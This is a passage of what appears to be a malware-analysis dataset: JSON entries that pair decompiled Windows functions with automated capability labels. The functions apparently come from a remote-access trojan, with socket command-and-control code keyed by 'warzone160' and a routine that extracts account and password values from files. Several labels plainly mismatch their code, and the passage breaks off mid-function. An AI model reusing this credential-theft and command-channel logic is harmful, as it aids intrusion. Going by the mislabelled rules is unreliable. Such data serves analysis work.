        "decompiled_code": "\nuint * fcn.00401052(uint *param_1, uchar param_2, uint32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    \n    if (param_3 != 0) {\n        puVar2 = param_1;\n        for (uVar1 = param_3 >> 2; uVar1 != 0; uVar1 = uVar1 - 1) {\n            *puVar2 = CONCAT22(CONCAT11(param_2, param_2), CONCAT11(param_2, param_2));\n            puVar2 = puVar2 + 1;\n        }\n        for (param_3 = param_3 & 3; param_3 != 0; param_3 = param_3 - 1) {\n            *puVar2 = param_2;\n            puVar2 = puVar2 + 1;\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 206
    },
    "00405d9d": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405d9d(code **param_1, code **param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    uVar1 = 0;\n    uVar2 = param_2 + (3 - param_1) >> 2;\n    if (param_2 < param_1) {\n        uVar2 = 0;\n    }\n    if (uVar2 != 0) {\n        do {\n            if (*param_1 != NULL) {\n                (**param_1)();\n            }\n            param_1 = param_1 + 1;\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < uVar2);\n    }\n    return;\n}\n",
        "token_count": 166
    },
    "0040611f": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040611f(int32_t param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    uint var_ch;\n    uint var_1h;\n    \n    uVar1 = 0;\n    do {\n        *(&var_ch + uVar1) = *((-(uVar1 < 4) & 4) + 0x14 + param_2) >> (('\\x03' - (uVar1 & 3)) * '\\b' & 0x1f);\n        uVar1 = uVar1 + 1;\n    } while (uVar1 < 8);\n    var_1h._0_1_ = 0x80;\n    while( true ) {\n        fcn.004061c5(1);\n        if ((*(param_2 + 0x14) & 0x1f8) == 0x1c0) break;\n        var_1h._0_1_ = 0;\n    }\n    fcn.004061c5(8);\n    uVar1 = 0;\n    do {\n        *(uVar1 + param_1) = *(param_2 + (uVar1 & 0xfffffffc)) >> (('\\x03' - (uVar1 & 3)) * '\\b' & 0x1f);\n        uVar1 = uVar1 + 1;\n    } while (uVar1 < 0x14);\n    fcn.00401052(param_2, 0, 0x5c);\n    fcn.00401052(&var_ch, 0, 8);\n    return;\n}\n",
        "token_count": 387
    },
    "00411bf8": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00411bf8(uint32_t arg_8h, uint32_t *arg_ch)\n\n{\n    uint8_t *puVar1;\n    uint32_t uVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    uint32_t in_EDX;\n    int32_t iVar4;\n    \n    iVar4 = (in_EDX >> 0x1f & 3U) + in_EDX >> 2;\n    puVar1 = in_ECX + iVar4 * 4;\n    for (iVar4 = -iVar4; iVar4 != 0; iVar4 = iVar4 + 1) {\n        arg_8h = (*(puVar1 + iVar4 * 4) * 0x16a88000 | *(puVar1 + iVar4 * 4) * -0x3361d2af >> 0x11) * 0x1b873593 ^\n                 arg_8h;\n        arg_8h = (arg_8h << 0xd | arg_8h >> 0x13) * 5 + 0xe6546b64;\n    }\n    uVar3 = 0;\n    uVar2 = in_EDX & 3;\n    if (uVar2 != 1) {\n        if (uVar2 != 2) {\n            if (uVar2 != 3) goto code_r0x00411c75;\n            uVar3 = puVar1[2] << 0x10;\n        }\n        uVar3 = uVar3 ^ puVar1[1] << 8;\n    }\n    arg_8h = arg_8h ^ ((*puVar1 ^ uVar3) * 0x16a88000 | (*puVar1 ^ uVar3) * -0x3361d2af >> 0x11) * 0x1b873593;\ncode_r0x00411c75:\n    uVar2 = ((arg_8h ^ in_EDX) >> 0x10 ^ arg_8h ^ in_EDX) * -0x7a143595;\n    uVar2 = (uVar2 >> 0xd ^ uVar2) * -0x3d4d51cb;\n    *arg_ch = uVar2 >> 0x10 ^ uVar2;\n    return;\n}\n",
        "token_count": 514
    },
    "004010b7": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint32_t fcn.004010b7(void)\n\n{\n    *0x419580 = *0x419580 * 0x343fd + 0x269ec3;\n    return *0x419580 >> 0x10 & 0x7fff;\n}\n",
        "token_count": 60
    },
    "004015c0": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004015c0(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t **in_ECX;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    uint var_10h;\n    uint var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    if (in_ECX[2] < in_ECX[1]) {\n        var_8h = *in_ECX;\n    }\n    else {\n        piVar3 = (in_ECX[2] + 1U) * in_ECX[3];\n        piVar1 = fcn.00405f53();\n        if (piVar1 == NULL) {\n            var_8h = NULL;\n        }\n        else {\n            var_8h = piVar1 + 1;\n            *piVar1 = piVar3;\n            for (piVar2 = piVar3; piVar2 != NULL; piVar2 = piVar2 + -1) {\n                piVar1[2] = 0;\n                piVar1[3] = 0;\n                piVar1 = piVar1 + 3;\n            }\n        }\n        if (in_ECX[2] != NULL) {\n            piVar1 = var_8h + 2;\n            piVar2 = NULL;\n            do {\n                piVar4 = (-8 - var_8h) + piVar1 + *in_ECX;\n                piVar1[-2] = *piVar4;\n                fcn.00403437(piVar4 + 1);\n                fcn.00403437(piVar4 + 2);\n                piVar2 = piVar2 + 1;\n                piVar1 = piVar1 + 3;\n            } while (piVar2 < in_ECX[2]);\n        }\n        if (*in_ECX != NULL) {\n            for (iVar5 = (*in_ECX)[-1]; iVar5 != 0; iVar5 = iVar5 + -1) {\n                fcn.00401416();\n            }\n        }\n        *in_ECX = var_8h;\n        in_ECX[1] = piVar3;\n    }\n    var_8h[in_ECX[2] * 3] = arg_8h;\n    fcn.00403437(&arg_ch);\n    fcn.00403437(&arg_10h);\n    in_ECX[2] = in_ECX[2] + 1;\n    fcn.00401416();\n    return;\n}\n",
        "token_count": 586
    },
    "0041213a": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0041213a(uint arg_8h, uint noname_1, uint noname_2, uint arg_14h, uint noname_4, uint noname_5, uint noname_6, \n            int32_t arg_24h, int32_t arg_28h)\n\n{\n    ushort uStack64;\n    int32_t iStack62;\n    uint uStack58;\n    uint uStack54;\n    uint uStack48;\n    int32_t iStack44;\n    int32_t iStack40;\n    ushort uStack36;\n    ushort uStack34;\n    uint uStack32;\n    int32_t iStack28;\n    \n    uStack48 = 0x28;\n    uStack36 = 1;\n    uStack34 = 0x18;\n    uStack32 = 0;\n    iStack28 = arg_28h * arg_24h * 3;\n    iStack44 = arg_24h;\n    iStack40 = arg_28h;\n    uStack54 = 0x36;\n    uStack64 = 0x4d42;\n    arg_28h = ((arg_24h + 1) * 3 & 0xfffffffcU) * arg_28h;\n    iStack62 = arg_28h + 0x36;\n    uStack58 = 0;\n    fcn.00402f91(&uStack64, 0xe);\n    fcn.00402f91(&uStack58 + 2, 0x28);\n    fcn.00402f91(arg_8h, arg_28h);\n    fcn.00404f2b(&stack0xffffffa8);\n    fcn.00403036();\n    fcn.00412f63();\n    return;\n}\n",
        "token_count": 390
    },
    "null": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "0040595e": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040595e(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    uint extraout_ECX;\n    uchar *arg_8h_00;\n    uint arg_ch;\n    uint arg_10h;\n    uint *arg_8h_01;\n    uint var_ch;\n    \n    fcn.00402e4c(&var_ch, **(in_ECX + 0x48) + 4, (*(in_ECX + 0x4c) - **(in_ECX + 0x48)) + -4);\n    arg_8h_01 = &var_ch;\n    fcn.0040304c(arg_8h_01);\n    arg_8h_00 = &stack0xffffffc8;\n    arg_ch = extraout_ECX;\n    arg_10h = extraout_ECX;\n    fcn.00405911(&stack0xffffffc8);\n    fcn.004060aa(arg_8h_00, arg_ch, arg_10h, arg_8h_01);\n    fcn.00403036();\n    return arg_8h;\n}\n",
        "token_count": 247
    },
    "00401e71": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00401e71(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    for (iVar1 = *(param_1 + -4); iVar1 != 0; iVar1 = iVar1 + -1) {\n        fcn.00403036();\n    }\n    return param_1 + -4;\n}\n",
        "token_count": 80
    },
    "004026c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004026c4(int32_t pNodeName)\n\n{\n    uint arg_10h;\n    int32_t iVar1;\n    uint in_ECX;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint noname_0;\n    uint *puVar2;\n    uint *arg_8h;\n    uint var_2ch;\n    uint var_24h;\n    uint var_20h;\n    uint var_ch;\n    int32_t var_8h;\n    \n    arg_10h = *(pNodeName + 4);\n    puVar2 = &pNodeName;\n    arg_8h = &var_ch;\n    fcn.00405c6d(arg_8h);\n    fcn.00403554(arg_8h);\n    fcn.00405ea5(arg_8h, puVar2);\n    iVar1 = (*_sym.imp.WS2_32.dll_inet_addr)(pNodeName);\n    noname_0 = extraout_ECX;\n    if (iVar1 == -1) {\n        var_8h = 0;\n        puVar2 = &var_2ch;\n        for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar2 = 0;\n            puVar2 = puVar2 + 1;\n        }\n        var_24h = 1;\n        var_20h = 6;\n        (*_sym.imp.WS2_32.dll_getaddrinfo)(pNodeName, 0, &var_2ch, &var_8h);\n        iVar1 = *(*(var_8h + 0x18) + 4);\n        noname_0 = extraout_ECX_00;\n    }\n    fcn.00413de9(noname_0, in_ECX, arg_10h, iVar1);\n    fcn.00405ea5();\n    return;\n}\n",
        "token_count": 425
    },
    "00409adf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409adf(uint lpFileName)\n\n{\n    char cVar1;\n    bool bVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    int32_t lpString2;\n    uint uVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint8_t *puVar11;\n    uint *arg_8h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    char *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint8_t *var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    \n    iVar4 = (*_sym.imp.KERNEL32.dll_CreateFileA)(lpFileName, 0x80000000, 7, 0, 3, 0, 0);\n    if (iVar4 == -1) {\n        (*_sym.imp.KERNEL32.dll_GetLastError)();\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(0xffffffff);\n        return;\n    }\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetFileSize)(iVar4, 0);\n    var_ch = uVar5;\n    pcVar6 = fcn.00401085(uVar5);\n    var_1ch = pcVar6;\n    fcn.00401052(pcVar6, 0, uVar5);\n    var_14h = 0;\n    (*_sym.imp.KERNEL32.dll_ReadFile)(iVar4, pcVar6, uVar5, &var_14h, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n    iVar7 = fcn.00405eb4();\n    var_18h = iVar7;\n    lpString2 = fcn.00405eb4();\n    var_8h = fcn.00405eb4();\n    bVar2 = false;\n    uVar5 = 0;\n    iVar4 = 0;\n    if (var_ch != 0) {\n        do {\n            cVar1 = pcVar6[uVar5];\n            iVar9 = iVar4;\n            if ((cVar1 - 0x21U < 0x5e) && (cVar1 != '=')) {\n                *(iVar4 + iVar7) = cVar1;\n                iVar9 = iVar4 + 1;\n                if (bVar2) {\n                    if (((((*(iVar4 + -7 + iVar7) == 'P') && (*(iVar4 + -6 + iVar7) == 'a')) &&\n                         (*(iVar4 + -5 + iVar7) == 's')) &&\n                        ((*(iVar4 + -4 + iVar7) == 's' && (*(iVar4 + -3 + iVar7) == 'w')))) &&\n                       ((*(iVar4 + -2 + iVar7) == 'o' && ((*(iVar4 + -1 + iVar7) == 'r' && (*(iVar4 + iVar7) == 'd')))))\n                       ) {\n                        iVar4 = 2;\n                        if (*pcVar6 != -0x30) {\n                            iVar4 = 9;\n                        }\n                        iVar7 = 0;\n                        uVar3 = pcVar6[iVar4 + uVar5];\n                        if (uVar3 < 0x21) goto code_r0x00409cc3;\n                        puVar11 = pcVar6 + iVar4 + uVar5;\n                        goto code_r0x00409cb0;\n                    }\n                }\n                else if ((((7 < iVar9) && (*(iVar4 + -6 + iVar7) == 'A')) && (*(iVar4 + -5 + iVar7) == 'c')) &&\n                        (((*(iVar4 + -4 + iVar7) == 'c' && (*(iVar4 + -3 + iVar7) == 'o')) &&\n                         ((*(iVar4 + -2 + iVar7) == 'u' && ((*(iVar4 + -1 + iVar7) == 'n' && (*(iVar4 + iVar7) == 't')))\n                          ))))) {\n                    iVar4 = 2;\n                    if (*pcVar6 != -0x30) {\n                        iVar4 = 9;\n                    }\n                    iVar10 = 0;\n                    var_10h = iVar4 + uVar5;\n                    uVar3 = var_10h[pcVar6];\n                    if (0x20 < uVar3) {\n                        var_10h = var_10h + pcVar6;\n                        puVar11 = var_10h;\n                        do {\n                            iVar7 = var_18h;\n                            pcVar6 = var_1ch;\n                            if (0x7e < uVar3) break;\n                            puVar11 = puVar11 + 1;\n                            *(iVar10 + lpString2) = uVar3;\n                            iVar10 = iVar10 + 1;\n                            uVar3 = *puVar11;\n                        } while (0x20 < uVar3);\n                    }\n                    *(iVar10 + lpString2) = 0;\n                    bVar2 = true;\n                }\n            }\n            uVar5 = uVar5 + 1;\n            iVar4 = iVar9;\n        } while (uVar5 < var_ch);\n    }\n    goto code_r0x00409d75;\n    while( true ) {\n        *(iVar7 + var_8h) = uVar3;\n        iVar7 = iVar7 + 1;\n        puVar11 = puVar11 + 1;\n        uVar3 = *puVar11;\n        if (uVar3 < 0x21) break;\ncode_r0x00409cb0:\n        if ((0x7e < uVar3) || (uVar3 == 0x21)) break;\n    }\ncode_r0x00409cc3:\n    var_30h = 0;\n    var_2ch = 0;\n    var_28h = 0;\n    *(iVar7 + var_8h) = 0;\n    fcn.004033bf(var_8h);\n    fcn.004033bf(lpString2);\n    uVar8 = fcn.0040309d(&var_1ch);\n    fcn.00403437(uVar8);\n    fcn.00405ea5();\n    uVar8 = fcn.0040309d(&var_1ch);\n    fcn.00403437(uVar8);\n    fcn.00405ea5();\n    var_24h = 5;\n    uVar8 = fcn.004035e5(0x414648);\n    fcn.00403437(uVar8);\n    fcn.00405ea5();\n    arg_8h = &var_30h;\n    fcn.00401f95(arg_8h);\n    fcn.00401fcb(arg_8h);\n    fcn.00405ea5();\n    fcn.00405ea5();\n    fcn.004013ef();\ncode_r0x00409d75:\n    fcn.00405ea5();\n    fcn.00405ea5();\n    fcn.00405ea5();\n    fcn.00401099(pcVar6);\n    return;\n}\n",
        "token_count": 1600
    },
    "00410346": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00410346(int16_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack28;\n    int16_t *arg_8h_00;\n    int16_t *piVar6;\n    \n    piVar6 = arg_8h;\n    *(in_ECX + 0x20) = arg_8h;\n    if ((*arg_8h == 0x5a4d) && (piVar2 = *(arg_8h + 0x1e) + arg_8h,  *piVar2 == 0x4550)) {\n        if (*(piVar2 + 1) == 0x14c) {\n            *(in_ECX + 0x40) = 1;\n            *(in_ECX + 0x24) = piVar2;\n            uStack28 = 0x410397;\n            fcn.00402f91(arg_8h, piVar2[0x15]);\n            iVar1 = *(in_ECX + 0x24);\n            arg_8h = NULL;\n            iVar4 = iVar1 + 0x18 + *(iVar1 + 0x14);\n            if (*(iVar1 + 6) != 0) {\n                do {\n                    arg_8h_00 = piVar6;\n                    fcn.00410ac3(piVar6, iVar4);\n                    fcn.00402296(arg_8h_00, iVar4, &stack0xffffffb8, uStack72, uStack68, uStack64, uStack60, uStack56, \n                                 uStack52, uStack48, uStack44);\n                    iVar4 = iVar4 + 0x28;\n                    arg_8h = arg_8h + 1;\n                } while (arg_8h < *(*(in_ECX + 0x24) + 6));\n            }\n        }\n        else if (*(piVar2 + 1) == -0x799c) {\n            iVar5 = 0;\n            *(in_ECX + 0x28) = piVar2;\n            *(in_ECX + 0x40) = 0;\n            uStack28 = 0x4103fd;\n            fcn.00402f91(arg_8h, piVar2[0x15]);\n            iVar1 = *(in_ECX + 0x28);\n            iVar4 = *(iVar1 + 0x14) + 0x18 + iVar1;\n            if (*(iVar1 + 6) != 0) {\n                do {\n                    piVar6 = arg_8h;\n                    fcn.00410ac3(arg_8h, iVar4);\n                    fcn.00402296(piVar6, iVar4, &stack0xffffffb8, uStack72, uStack68, uStack64, uStack60, uStack56, \n                                 uStack52, uStack48, uStack44);\n                    iVar5 = iVar5 + 1;\n                    iVar4 = iVar4 + 0x28;\n                } while (iVar5 < *(*(in_ECX + 0x28) + 6));\n            }\n        }\n        uVar3 = 1;\n        *(in_ECX + 0x3c) = 1;\n    }\n    else {\n        uVar3 = 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 818
    },
    "00402296": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00402296(int32_t arg_8h, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint arg_30h)\n\n{\n    int32_t *piVar1;\n    int32_t **in_ECX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t *piVar5;\n    int32_t *piVar6;\n    uint var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    if (in_ECX[2] < in_ECX[1]) {\n        var_10h = *in_ECX;\n    }\n    else {\n        piVar3 = (in_ECX[2] + 1U) * in_ECX[3];\n        piVar1 = fcn.00405f53();\n        if (piVar1 == NULL) {\n            var_10h = NULL;\n        }\n        else {\n            var_10h = piVar1 + 1;\n            *piVar1 = piVar3;\n            if (piVar3 != NULL) {\n                piVar1 = piVar1 + 0xb;\n                piVar5 = piVar3;\n                do {\n                    *piVar1 = 0;\n                    piVar1[1] = 0;\n                    piVar5 = piVar5 + -1;\n                    piVar1 = piVar1 + 0xc;\n                } while (piVar5 != NULL);\n            }\n        }\n        var_4h = NULL;\n        if (in_ECX[2] != NULL) {\n            var_8h = 0;\n            piVar1 = var_10h;\n            do {\n                piVar5 = *in_ECX;\n                piVar4 = piVar5 + var_8h;\n                piVar6 = piVar1;\n                for (iVar2 = 10; iVar2 != 0; iVar2 = iVar2 + -1) {\n                    *piVar6 = *piVar4;\n                    piVar4 = piVar4 + 1;\n                    piVar6 = piVar6 + 1;\n                }\n                fcn.00402e93(piVar5 + var_8h + 10);\n                var_4h = var_4h + 1;\n                var_8h = var_8h + 0x30;\n                piVar1 = piVar1 + 0xc;\n            } while (var_4h < in_ECX[2]);\n        }\n        if (*in_ECX != NULL) {\n            fcn.00401e71();\n        }\n        *in_ECX = var_10h;\n        in_ECX[1] = piVar3;\n    }\n    piVar1 = &arg_8h;\n    piVar3 = var_10h + in_ECX[2] * 0xc;\n    for (iVar2 = 10; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *piVar3 = *piVar1;\n        piVar1 = piVar1 + 1;\n        piVar3 = piVar3 + 1;\n    }\n    fcn.00402e93(&arg_30h);\n    in_ECX[2] = in_ECX[2] + 1;\n    fcn.00403036();\n    return;\n}\n",
        "token_count": 796
    },
    "004102b9": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004102b9(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint32_t arg_ch_00;\n    uint var_3ch;\n    uint var_14h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    arg_ch_00 = 0;\n    if (*(in_ECX + 0x34) != 0) {\n        var_ch = in_ECX + 0x2c;\n        var_8h = 0;\n        do {\n            iVar1 = var_8h;\n            fcn.00405ca3();\n            fcn.00410af9(*(in_ECX + 0x2c) + iVar1);\n            fcn.004033bf(&var_3ch);\n            iVar1 = fcn.004033a3(arg_ch);\n            fcn.00405ea5();\n            fcn.00403036();\n            if (iVar1 != 0) {\n                fcn.0040239e(arg_8h, arg_ch_00);\n                return;\n            }\n            arg_ch_00 = arg_ch_00 + 1;\n            var_8h = var_8h + 0x30;\n        } while (arg_ch_00 < *(in_ECX + 0x34));\n    }\n    return;\n}\n",
        "token_count": 309
    },
    "004055a5": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool __cdecl fcn.004055a5(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    bool bVar3;\n    uint *arg_8h_00;\n    uint arg_10h;\n    uint uVar4;\n    uint uVar5;\n    uint var_14h;\n    uint buf;\n    uint var_8h;\n    \n    if (*(in_ECX + 0xc) == -1) {\n        bVar3 = false;\n    }\n    else {\n        uVar1 = fcn.004033bf(\"warzone160\");\n        fcn.00403003(uVar1);\n        fcn.00405ea5();\n        iVar2 = arg_8h;\n        uVar4 = extraout_ECX;\n        uVar5 = extraout_ECX;\n        fcn.0040304c(arg_8h);\n        arg_8h_00 = &var_14h;\n        uVar1 = extraout_ECX_00;\n        arg_10h = extraout_ECX_00;\n        fcn.0040304c(arg_8h_00);\n        fcn.004060aa(arg_8h_00, uVar1, arg_10h, iVar2);\n        iVar2 = (*_sym.imp.WS2_32.dll_send)(*(in_ECX + 0xc), buf, *(arg_8h + 4), 0, uVar4, uVar5);\n        bVar3 = iVar2 != -1;\n        fcn.00403036();\n        fcn.00403036();\n    }\n    return bVar3;\n}\n",
        "token_count": 380
    },
    "0040562f": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.0040562f(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t arg_ch;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint arg_ch_00;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uchar auStackY65600 [65520];\n    uint uStackY80;\n    uint *arg_8h_00;\n    uint uVar3;\n    uint arg_10h;\n    uint *puVar4;\n    uint var_38h;\n    uint var_34h;\n    uchar *var_30h;\n    int32_t var_28h;\n    uint var_20h;\n    uint optname;\n    uint *var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    fcn.00401190();\n    if (*(extraout_ECX + 0xc) != -1) {\n        var_10h = 4;\n        var_14h = &fcn.0040562f::optname;\n        optname = 0x1006;\n        var_ch = unaff_EDI;\n        var_8h = unaff_ESI;\n        (*_sym.imp.WS2_32.dll_setsockopt)();\n        var_30h = 0x40567c;\n        fcn.00401052();\n        var_28h = fcn.004033bf(\"warzone160\");\n        fcn.00403003(var_28h);\n        fcn.00405ea5();\n        var_14h = NULL;\n        var_10h = 0;\n        do {\n            var_30h = 0xc;\n            arg_ch = (*_sym.imp.WS2_32.dll_recv)();\n            if (arg_ch == 0xc) {\n                var_30h = &stack0xfffeffc0;\n                var_ch = 0;\n                var_8h = 0;\n                fcn.00402f91(var_30h, 0xc);\n                puVar4 = &fcn.0040562f::var_ch;\n                fcn.0040304c(puVar4);\n                arg_8h_00 = &fcn.0040562f::var_30h;\n                uStackY80 = 0x4056f7;\n                uVar3 = extraout_ECX_00;\n                arg_10h = extraout_ECX_00;\n                fcn.0040304c(arg_8h_00);\n                uStackY80 = 0x4056ff;\n                fcn.004060aa(arg_8h_00, uVar3, arg_10h, puVar4);\n                iVar1 = *(var_28h + 4) + 0xc;\n                if ((*(var_28h + 4) != 0) && (iVar1 != 0xc)) {\n                    do {\n                        uStackY80 = 0x40572c;\n                        iVar2 = (*_sym.imp.WS2_32.dll_recv)();\n                        if (iVar2 == -1) {\n                            fcn.00403036();\n                            fcn.00403036();\n                            goto code_r0x004057dc;\n                        }\n                        arg_ch = arg_ch + iVar2;\n                    } while (iVar1 != arg_ch);\n                }\n                fcn.00403036();\n                fcn.00403036();\n            }\n            else if (arg_ch == -1) break;\n            var_14h = &stack0xfffeffc0;\n            optname = 0x405766;\n            var_10h = arg_ch;\n            fcn.00402f91(var_14h, arg_ch);\n            optname = extraout_ECX_01;\n            fcn.0040304c(&fcn.0040562f::var_14h);\n            puVar4 = &fcn.0040562f::var_30h;\n            var_30h = 0x405780;\n            uVar3 = arg_ch_00;\n            fcn.0040304c(puVar4);\n            var_30h = 0x405788;\n            fcn.004060aa(puVar4, arg_ch_00, uVar3, &fcn.0040562f::var_14h);\n            fcn.00402fc3();\n            fcn.00402f91(arg_ch, arg_ch);\n            fcn.00402fc3();\n            fcn.00402fc3();\n            var_28h = arg_8h;\n            fcn.00404f65(arg_8h);\n            fcn.00403036();\n        } while (0 < arg_ch);\ncode_r0x004057dc:\n        fcn.00403036();\n        fcn.00403036();\n        fcn.00403036();\n    }\n    return;\n}\n",
        "token_count": 1188
    },
    "004057fb": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004057fb(uint pNodeName, uint hostshort)\n\n{\n    ushort uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t iVar3;\n    uint *puVar4;\n    uint uVar5;\n    uint var_24h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t pAddrInfo;\n    \n    pAddrInfo = 0;\n    fcn.00403125(&pNodeName);\n    *(in_ECX + 4) = hostshort;\n    fcn.0041026f();\n    puVar4 = &var_24h;\n    for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    var_18h = 6;\n    uVar5 = 1;\n    var_1ch = 1;\n    iVar3 = (*_sym.imp.WS2_32.dll_getaddrinfo)(pNodeName, 0, &var_24h, &pAddrInfo);\n    if (iVar3 == 0) {\n        iVar3 = *(pAddrInfo + 0x18);\n        iVar2 = (*_sym.imp.WS2_32.dll_socket)(2, 1, 0);\n        *(in_ECX + 0xc) = iVar2;\n        if (iVar2 != -1) {\n            *(in_ECX + 0x1cc) = *(iVar3 + 4);\n            *(in_ECX + 0x1c8) = 2;\n            uVar1 = (*_sym.imp.WS2_32.dll_htons)(hostshort);\n            *(in_ECX + 0x1ca) = uVar1;\n            (*_sym.imp.WS2_32.dll_freeaddrinfo)(pAddrInfo);\n            iVar3 = (*_sym.imp.WS2_32.dll_connect)(*(in_ECX + 0xc), in_ECX + 0x1c8, 0x10);\n            if (iVar3 != -1) {\n                *(in_ECX + 8) = 1;\n                (*_sym.imp.KERNEL32.dll_ReleaseMutex)(*(in_ECX + 0x1d8));\n                goto code_r0x004058b1;\n            }\n            *(in_ECX + 0xc) = 